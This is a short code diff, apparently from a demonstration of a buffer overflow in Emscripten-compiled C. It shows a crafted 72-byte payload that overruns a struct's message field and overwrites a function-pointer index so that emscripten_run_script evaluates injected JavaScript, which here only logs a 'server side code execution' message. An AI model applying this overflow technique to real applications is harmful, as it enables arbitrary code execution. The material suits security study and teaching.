@@ -25,11 +25,11 @@ Comms comms;
 comms.out = &communicate;
 printf("&communicate: %p\n", &communicate); // 0x4
 printf("&emscripten_run_script: %p\n", &emscripten_run_script); // 0x5
-char *payload = "alert('test');// " // 17 bytes; "//" lets eval work
-  "                " // + 16
-  "                " // + 16
-  "                " // + 16 to fill .msg = 65
-  " " // + 1 for alignment = 66
+char *payload = "console.log('>>>" // 16 bytes
+  "Server side code" // + 16
+  " execution!');//" // + 16; '//' lets eval() work
+  "                " // + 16 to fill .msg = 64
+  "  " // + 2 for alignment = 66
   "\x40\x00" // + 2 bytes to fill .msg_len = 68
   "\x05\x00\x00\x00"; // + 4 bytes to overwrite .out= 72
   memcpy(comms.msg, payload, 72);
